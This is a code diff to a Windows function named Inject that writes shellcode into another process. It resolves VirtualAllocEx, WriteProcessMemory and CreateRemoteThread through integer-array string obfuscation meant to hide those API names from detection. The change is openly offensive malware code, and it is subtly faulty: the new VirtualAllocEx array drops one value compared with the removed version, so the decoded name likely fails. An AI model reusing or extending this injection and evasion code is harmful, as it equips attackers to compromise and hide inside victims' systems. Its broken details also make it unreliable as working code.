@@ -416,13 +416,34 @@ BOOL Inject(DWORD dwPID, Shellcode shellcode) {
 
     // Dynamic API resolution
     HMODULE hKernel32 = GetModuleHandle(L"kernel32.dll");
+
+    // Deobfuscate API names into temporary strings
+    int valloc_arr[] = { 44654, 44641, 44650, 44652, 44653, 44633, 44644, 44647, 44635, 44637, 44656, 44581, 44656 };
+    wchar_t* valloc_name = deobf_int_array(valloc_arr, sizeof(valloc_arr) / sizeof(int), 44536);
+
+    int write_arr[] = { 44655, 44650, 44641, 44652, 44637, 44648, 44650, 44647, 44635, 44637, 44651, 44651, 44645, 44637, 44645, 44647, 44650, 44657 };
+    wchar_t* write_name = deobf_int_array(write_arr, sizeof(write_arr) / sizeof(int), 44536);
+
+    int create_arr[] = { 44635, 44650, 44637, 44633, 44652, 44637, 44650, 44637, 44645, 44647, 44652, 44637, 44652, 44644, 44650, 44637, 44633, 44636 };
+    wchar_t* create_name = deobf_int_array(create_arr, sizeof(create_arr) / sizeof(int), 44536);
+
     typedef LPVOID(WINAPI* pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
     typedef BOOL(WINAPI* pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
     typedef HANDLE(WINAPI* pCreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
 
-    pVirtualAllocEx fnVirtualAllocEx = (pVirtualAllocEx)GetProcAddress(hKernel32, deobf_int_array((int[]){ 44654, 44641, 44650, 44652, 44653, 44633, 44644, 44644, 44647, 44635, 44637, 44656, 44581, 44656 }, 14, 44536));
-    pWriteProcessMemory fnWriteProcessMemory = (pWriteProcessMemory)GetProcAddress(hKernel32, deobf_int_array((int[]){ 44655, 44650, 44641, 44652, 44637, 44648, 44650, 44647, 44635, 44637, 44651, 44651, 44645, 44637, 44645, 44647, 44650, 44657 }, 18, 44536));
-    pCreateRemoteThread fnCreateRemoteThread = (pCreateRemoteThread)GetProcAddress(hKernel32, deobf_int_array((int[]){ 44635, 44650, 44637, 44633, 44652, 44637, 44650, 44637, 44645, 44647, 44652, 44637, 44652, 44644, 44650, 44637, 44633, 44636 }, 18, 44536));
+    pVirtualAllocEx fnVirtualAllocEx = (pVirtualAllocEx)GetProcAddress(hKernel32, valloc_name);
+    pWriteProcessMemory fnWriteProcessMemory = (pWriteProcessMemory)GetProcAddress(hKernel32, write_name);
+    pCreateRemoteThread fnCreateRemoteThread = (pCreateRemoteThread)GetProcAddress(hKernel32, create_name);
+
+    // Clean up temporary strings
+    delete[] valloc_name;
+    delete[] write_name;
+    delete[] create_name;
+
+    if (!fnVirtualAllocEx || !fnWriteProcessMemory || !fnCreateRemoteThread) {
+        OutputDebugString(L"[-] Failed to resolve APIs\n");
+        return 0;
+    }
 
     HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, FALSE, dwPID);
     if (!hProcess) {
